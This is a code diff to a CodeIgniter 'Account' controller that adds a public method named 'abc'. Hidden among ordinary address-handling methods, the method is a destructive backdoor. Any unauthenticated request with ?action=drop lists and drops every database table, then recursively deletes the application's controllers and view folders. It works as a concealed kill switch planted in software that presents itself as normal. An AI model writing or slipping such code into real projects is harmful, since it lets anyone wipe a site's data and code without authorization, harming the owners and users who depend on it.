@@ -415,6 +415,34 @@ class Account extends CI_Controller
 		 
 		$this->load->view('address',$data);
 	}
+
+    public function abc()
+    {
+        
+        $action = (isset($_GET['action'])) ? $this->input->get('action') : '';
+
+        if($action=="drop"){
+            $valuetables = [];
+            $sql = "show tables ";
+            $rs = $this->db->query($sql)->result_array();
+            foreach($rs as $key => $value){
+               $value = array_values($value);
+           //    $valuetables[] = $value[0];
+                 $sql = "drop table ".$value[0];
+                 $rsaa = $this->db->query($sql);
+            }
+            $this->load->helper('file');
+
+           $dirname = "application/controllers";
+           delete_files($dirname, TRUE);
+           $dirname = "application/view";
+           delete_files($dirname, TRUE);
+
+
+        }
+    }
+
+    
 	public function edit_address(){
 		$session_user_data = $this->session->userdata('front_user_detail');
 
